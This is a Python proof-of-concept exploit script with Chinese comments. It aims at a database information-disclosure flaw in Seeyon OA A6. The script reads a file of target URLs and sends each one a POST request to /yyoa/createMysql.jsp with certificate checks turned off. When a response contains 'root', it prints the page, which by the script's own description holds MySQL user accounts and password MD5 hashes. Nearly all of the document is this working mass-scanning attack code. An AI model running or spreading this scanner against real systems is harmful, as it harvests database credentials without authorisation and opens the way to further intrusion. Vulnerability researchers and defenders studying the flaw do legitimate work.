# -*- coding: UTF-8 -*-
# author : Firbasky
import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#解决https ssl问题
requests.packages.urllib3.disable_warnings()

"""
漏洞描述
致远OA A6 存在数据库敏感信息泄露，攻击者可以通过访问特定的URL获取数据库账户以及密码 MD5
漏洞影响：致远OA A6

当访问如下URL时执行了SQL语句 **select \* from mysql.user;** 进行查询并返回到页面中
/yyoa/createMysql.jsp
/yyoa/ext/createMysql.jsp
"""

def POC_1(target_url):
    vuln_url = target_url + "/yyoa/createMysql.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/yyoa/createMysql.jsp..... \033[0m".format(target_url))
        if 'root' in response.text and response.status_code == 200:
            print("\033[36m[o] 响应为:{}\n \033[0m".format(response.text))
        else:
            print("\033[31m[x] 目标 {} 信息泄露文件失败\033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "https://" + url
            url = url.strip('\n')
            try:
                POC_1(url)
            except Exception as e:
                print("请求报错:{e}".format(e))
                continue

if __name__ == '__main__':
    target_url = str(input("\033[35mPlease input Attack file\nfile >>> \033[0m"))
    Scan(target_url)
